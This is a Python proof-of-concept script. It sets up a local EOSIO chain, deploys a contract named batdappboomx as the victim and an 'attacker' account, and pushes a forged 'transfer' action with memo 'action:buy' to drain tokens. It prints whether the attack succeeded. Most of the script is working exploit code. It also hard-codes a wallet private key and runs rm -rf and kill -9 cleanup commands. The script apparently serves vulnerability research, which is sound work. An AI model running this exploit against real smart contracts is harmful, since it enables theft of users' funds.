#!/usr/bin/python

import os
import commands
import time

PUBLIC_KEY = "EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV"


def executeCommand(cmd):
    r, o = commands.getstatusoutput(cmd)
    return r, o


def getCurrency(account, permission):
    _, res = executeCommand("cleos get currency balance {} {} EOS".format(permission, account))
    tmp = res.split(' ')[0]
    return float(tmp) if tmp else 0


def createAccount(name):
    executeCommand("cleos create account eosio {} {}".format(name, PUBLIC_KEY))


def setContract(name, contractAddress, permission):
    executeCommand( "cleos set contract {} {} -p {}".format(name, contractAddress, permission))


def pushAction(contract, action, arguments, permission):    
    return executeCommand("cleos push action {} {} \'{}\' -p {}".format(contract, action, arguments, permission))


def addCodePermission(name):
    executeCommand("cleos set account permission {} active --add-code".format(name))


def init():
    os.system('keosd --max-body-size 100000000 &')
    os.system("rm -rf .local/share/eosio/ /root/eosio-wallet/")

    os.system("cleos wallet create -f /root/passwd")
    os.system('cat ~/passwd | cleos wallet unlock')
    os.system("cleos wallet import --private-key 5KQwrPbwdL6PhXujxW37FSSQZ1JiwsST4cqQzDeyXtP79zkvFD3")

    os.system('nodeos -e -p eosio\
                --plugin eosio::chain_api_plugin \
                --plugin eosio::http_plugin \
                --plugin eosio::history_plugin \
                --plugin eosio::history_api_plugin\
                --access-control-allow-origin=\'*\' \
                --contracts-console \
                --http-validate-host=false \
                --verbose-http-errors \
                --max-transaction-time=1000 \
                --max-body-size=102400000 \
                --genesis-json genesis.json \
                >> nodeos.log 2>&1 &')
    time.sleep(2)

    # eosio.token
    createAccount('eosio.token')
    setContract('eosio.token', "/root/eosio.token/", 'eosio.token@active')
    pushAction('eosio.token', 'create', '["eosio","20000000000000.0000 EOS"]', 'eosio.token@active')
    pushAction('eosio.token', 'issue', '["eosio", "20000000000000.0000 EOS",""]', 'eosio@active')

    # any user
    createAccount('attacker')
    addCodePermission('attacker')
    pushAction('eosio.token', 'transfer', '["eosio","attacker","10000000.0000 EOS",""]', 'eosio@active')

if __name__ == "__main__":
    init()
    
    # deploy the victim
    createAccount("batdappboomx")
    addCodePermission("batdappboomx")
    setContract("batdappboomx", "/root/batdappboomx/", "batdappboomx@active")
    pushAction('eosio.token', 'transfer', '[ "eosio", "batdappboomx","100.0000 EOS","initing"]', 'eosio@active')

    before_victim = getCurrency('batdappboomx', 'eosio.token')
    before_attacker = getCurrency("attacker", 'eosio.token')

    # exploit
    cmd = "cleos push action batdappboomx transfer \'{\"from\":\"attacker\", \"to\":\"batdappboomx\", \"quantity\":\"100.0000 EOS\", \"memo\":\"action:buy\"}\' -p attacker@active"
    executeCommand(cmd)

    after_victim = getCurrency('batdappboomx', 'eosio.token')
    after_attacker = getCurrency("attacker", 'eosio.token')
    
    # check the balance
    print "[+] victim's balance: {:.2f} -> {:.2f}".format(before_victim, after_victim)
    print "[+] attacker's balance: {:.2f} {:.2f}\n".format(before_attacker, after_attacker)
    if after_attacker > before_attacker:
        print "[+] Attacked successfully. Got more cryptocurrency."
    else:
        print "[-] Fail."

    # clean
    os.system("ps -ef | grep nodeos | grep -v grep | awk '{print $2}' | xargs kill -9")
    os.system("ps -ef | grep keosd | grep -v grep | awk '{print $2}' | xargs kill -9")  
